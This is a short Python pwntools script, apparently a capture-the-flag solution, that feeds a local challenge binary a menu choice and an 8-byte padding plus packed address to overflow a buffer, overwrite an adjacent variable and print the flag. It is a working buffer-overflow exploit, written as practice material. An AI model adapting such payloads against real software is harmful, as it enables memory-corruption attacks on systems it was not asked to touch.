from pwn import *

# Connect to the local service
r = process('./chall')  # Replace 'your_program' with the name of your binary

# Receive the initial prompt
r.recvuntil("Enter your choice: ")

# Overflow input_data to overwrite safe_var
offset =8 # Offset between input_data and safe_var
payload = b"A" * offset + p64(0x123456789abcdef)  # Replace 0x123456789abcdef with the desired address

# Send option 2 to write to buffer
r.sendline(b"2")

# Send the crafted payload
r.sendline(payload)

# Trigger check_win() to print the flag
r.sendline(b"4")  # Choose option 4 (Print Flag)

# Receive all data with a timeout of 1 
print(r.recvall(timeout=1).decode())
